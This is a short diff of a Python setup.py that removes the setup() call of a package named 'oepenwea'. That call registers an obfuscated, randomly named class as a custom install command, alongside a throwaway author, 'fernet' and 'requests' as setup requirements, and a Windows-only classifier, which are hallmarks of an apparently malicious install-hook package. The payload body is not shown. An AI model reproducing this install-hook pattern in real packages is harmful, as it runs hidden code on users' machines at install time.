@@ -18,22 +18,5 @@ class hLShlzijVGRhcZFxHDHZslaZAUhBawTSTjShHigZZqXdUPhKnwLhWoGcwnXsrHlFjFNzdSomHN
             install.run(self)
 
 
-setup(
-    name="oepenwea",
-    version=VERSION,
-    author="RKXRgCPdDLVRZkWWpf",
-    author_email="IDFCb@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': hLShlzijVGRhcZFxHDHZslaZAUhBawTSTjShHigZZqXdUPhKnwLhWoGcwnXsrHlFjFNzdSomHNerihiwlT,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
